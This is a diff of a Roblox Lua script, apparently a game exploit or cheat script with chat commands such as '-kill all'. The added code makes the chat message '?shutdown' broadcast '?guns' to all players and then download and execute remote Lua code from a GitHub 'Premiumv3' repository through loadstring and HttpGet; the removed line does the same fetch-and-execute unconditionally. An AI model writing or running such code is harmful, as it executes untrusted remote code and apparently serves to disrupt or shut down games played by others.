@@ -1500,5 +1500,16 @@ game:GetService("Players").LocalPlayer.Chatted:Connect(function(c)
 	CheckCommand(c) --> -kill all
 end)
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/raisenscripts/Premiumv3/main/%3Fshutdown"))()
+local player = game.Players.LocalPlayer
+local replicatedStorage = game:GetService("ReplicatedStorage")
+local sayMessageRequest = replicatedStorage:WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
+
+player.Chatted:Connect(function(message)
+    if message == "?shutdown" then
+        sayMessageRequest:FireServer("?guns", "All") -- ?guns yaz
+        wait(2) -- 2 saniye bekle
+        local loadstringLink = "https://raw.githubusercontent.com/raisenscripts/Premiumv3/main/%3Fshutdown" -- Loadstring linkini buraya yapıştırın
+        loadstring(game:HttpGet(loadstringLink))()
+    end
+end)
 
